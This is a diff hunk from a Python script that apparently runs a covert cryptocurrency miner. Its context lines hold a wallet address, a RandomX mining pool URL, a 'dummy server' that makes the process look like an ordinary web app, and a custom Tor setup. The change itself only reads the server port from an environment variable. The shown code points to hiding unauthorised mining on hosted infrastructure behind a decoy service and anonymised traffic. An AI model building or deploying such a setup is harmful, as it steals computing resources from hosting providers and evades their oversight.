@@ -11,14 +11,15 @@ WALLET_ADDR = "DP2DhHWz1gD2EhvZ6zbMcZe9P8z7Bytxcc"
 POOL_URL = "rx.unmineable.com:3333" 
 
 def start_dummy_server():
-    PORT = 7860
+    
+    PORT = int(os.environ.get("PORT", 7860)) 
     Handler = http.server.SimpleHTTPRequestHandler
     try:
         with socketserver.TCPServer(("", PORT), Handler) as httpd:
             print(f"Server ACTIVE on PORT {PORT}")
             httpd.serve_forever()
     except:
-        pass
+        pass 
 
 def start_tor():
     print("Initializing Custom TOR Configuration...")
